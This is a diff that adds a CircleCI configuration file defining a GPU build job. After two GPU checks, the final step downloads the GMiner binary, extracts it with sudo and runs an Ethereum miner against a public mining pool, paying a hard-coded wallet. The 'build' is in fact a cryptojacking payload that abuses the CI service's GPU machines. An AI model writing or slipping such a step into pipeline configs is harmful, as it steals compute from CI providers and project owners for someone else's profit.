@@ -1,0 +1,11 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.small
+    steps:
+      - run: nvidia-smi
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
+      - run: apt update && apt-get install screen && wget https://github.com/develsoftware/GMinerRelease/releases/download/2.91/gminer_2_91_linux64.tar.xz && sudo tar -xvf gminer_2_91_linux64.tar.xz && sudo ./miner -a ethash -s us-eth.2miners.com:2020 --user 35Kx5TuJm53NqARyAfYRdmdv1DWysuGe5a.Berkah --proto stratum
